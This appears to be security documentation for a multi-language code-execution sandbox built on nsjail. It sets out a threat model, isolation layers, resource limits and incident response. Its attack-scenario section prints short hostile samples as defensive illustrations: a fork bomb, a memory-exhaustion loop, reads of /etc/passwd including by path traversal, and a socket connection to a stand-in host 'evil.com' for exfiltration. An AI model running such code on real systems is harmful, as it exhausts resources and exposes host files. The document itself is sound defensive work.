# Security Documentation

## Threat Model

### Attacker Capabilities

We assume attackers can:
- Submit arbitrary code in any supported language
- Attempt to escape the sandbox
- Try to access the host filesystem
- Attempt network exfiltration
- Try resource exhaustion attacks (fork bombs, infinite loops)
- Attempt to read other users' code or results

### Security Objectives

1. **Isolation**: User code cannot affect host system
2. **Confidentiality**: User code/results isolated from other users
3. **Availability**: Resource limits prevent DoS
4. **Integrity**: System remains unmodified after execution

## Security Layers

### Layer 1: Input Validation (PHP API)

```php
// Language whitelist - only allow known languages
if (!isValidLanguage($language)) {
    sendError('Unsupported language');
}

// Code size limit (64KB)
if (strlen($code) > 65536) {
    sendError('Code too large');
}

// Rate limiting (10 requests/min/IP)
if (!checkRateLimit($clientIp)) {
    sendError('Rate limit exceeded', 429);
}
```

**Mitigations:**
- Strict language whitelist prevents unknown execution paths
- Code size limits prevent memory exhaustion
- Rate limiting prevents abuse

### Layer 2: Process Isolation (nsjail)

nsjail provides Linux namespace isolation:

| Namespace | Purpose |
|-----------|---------|
| PID | Process isolation - cannot see host processes |
| NET | Network isolation - no network access |
| MNT | Mount isolation - custom filesystem view |
| UTS | Hostname isolation |
| IPC | IPC isolation - no shared memory |
| USER | User isolation - runs as unprivileged user |

**Configuration highlights:**

```protobuf
# Namespace isolation
clone_newnet: true    # No network
clone_newuser: true   # Unprivileged user
clone_newns: true     # Isolated mounts
clone_newpid: true    # Isolated process tree
clone_newipc: true    # No shared memory
clone_newuts: true    # Isolated hostname
```

### Layer 3: Resource Limits

| Resource | Limit | Purpose |
|----------|-------|---------|
| `rlimit_as` | 256MB-1GB | Memory limit |
| `rlimit_cpu` | 30-90s | CPU time limit |
| `rlimit_fsize` | 10MB | Max file size |
| `rlimit_nofile` | 64-128 | Open file limit |
| `rlimit_nproc` | 32-64 | Process limit |
| `time_limit` | 30-90s | Wall clock limit |

**Fork bomb protection:**
```protobuf
rlimit_nproc: 32  # Max 32 processes
```

**Memory bomb protection:**
```protobuf
rlimit_as: 268435456  # 256MB max
```

### Layer 4: Filesystem Isolation

```protobuf
# Read-only system mounts
mount {
    src: "/usr"
    dst: "/usr"
    is_bind: true
    rw: false  # READ ONLY
}

# Writable workspace only
mount {
    src: "{{WORKSPACE}}"
    dst: "/workspace"
    is_bind: true
    rw: true
}

# tmpfs for /tmp
mount {
    dst: "/tmp"
    fstype: "tmpfs"
    rw: true
    options: "size=16777216"  # 16MB max
}
```

### Layer 5: Syscall Filtering (Seccomp)

The Python config includes a comprehensive seccomp filter that whitelists allowed syscalls. Dangerous syscalls are blocked:

**Blocked (not in whitelist):**
- `mount`, `umount` - Cannot modify mounts
- `reboot`, `kexec_load` - Cannot reboot system
- `init_module`, `delete_module` - Cannot load kernel modules
- `ptrace` (restricted) - Cannot debug other processes

### Layer 6: Network Isolation

```protobuf
clone_newnet: true  # Creates empty network namespace
```

This means:
- No loopback interface (127.0.0.1 unavailable)
- Cannot connect to external services
- Cannot exfiltrate data via network

### Layer 7: PHP Sandbox (PHP language)

For PHP execution, additional restrictions via disable_functions directive prevent dangerous function calls.

## Security Best Practices

### Code Execution Flow

```
1. API receives code
   └─> Validate language (whitelist)
   └─> Validate code size (max 64KB)
   └─> Check rate limit
   └─> Generate unique job ID (uniqid)

2. Worker processes job
   └─> Create isolated workspace (/sandbox/jobs/{jobId})
   └─> Write code to file (no user input in filename)
   └─> Compile if needed (fixed compiler path, no shell)
   └─> Execute in nsjail sandbox
   └─> Capture stdout/stderr (max 64KB each)
   └─> Cleanup workspace (rm -rf)
```

### No Shell Injection

The worker uses `spawn` with argument arrays, never shell command strings:

```javascript
// SAFE - spawn with array arguments, no shell interpolation
const { spawn } = require('child_process');
spawn(NSJAIL_BIN, ['--config', configPath, '--', binary]);

// The codebase NEVER uses shell-based command execution
// All process spawning uses spawn() with explicit argument arrays
```

### Workspace Isolation

Each job gets a unique workspace:
```
/sandbox/jobs/job_65abc123.456789/
├── main.py          # User code
├── nsjail.cfg       # Temporary config
└── output           # Compiled binary (if applicable)
```

The workspace is deleted after execution.

## Attack Scenarios & Mitigations

### Scenario 1: Fork Bomb

```python
import os
while True:
    os.fork()
```

**Mitigation:** `rlimit_nproc: 32` limits to 32 processes.

### Scenario 2: Memory Exhaustion

```c
int main() {
    while(1) malloc(1000000);
}
```

**Mitigation:** `rlimit_as: 268435456` limits to 256MB.

### Scenario 3: Infinite Loop

```python
while True:
    pass
```

**Mitigation:** `time_limit: 30` kills after 30 seconds.

### Scenario 4: File System Access

```python
open('/etc/passwd').read()
```

**Mitigation:** `/etc` not mounted in sandbox.

### Scenario 5: Network Exfiltration

```python
import socket
s = socket.socket()
s.connect(('evil.com', 80))
```

**Mitigation:** `clone_newnet: true` - no network namespace.

### Scenario 6: Path Traversal

```python
open('../../../etc/passwd')
```

**Mitigation:** Workspace is the only writable location, system dirs read-only.

## Monitoring Recommendations

1. **Log all executions** with language, code hash, IP hash
2. **Alert on high error rates** (may indicate attack attempts)
3. **Monitor resource usage** per job
4. **Track rate limit hits** per IP
5. **Review nsjail logs** for policy violations

## Incident Response

If a sandbox escape is suspected:

1. **Stop the worker** immediately
2. **Preserve logs** from worker and nsjail
3. **Check host filesystem** for unexpected changes
4. **Review recent job history** for suspicious patterns
5. **Update nsjail** to latest version
6. **Audit seccomp profile** for missing restrictions

## Updates & Maintenance

- Keep nsjail updated (security fixes)
- Update compilers regularly
- Review seccomp profiles when adding languages
- Monitor for CVEs in execution environments
- Test sandbox escapes periodically
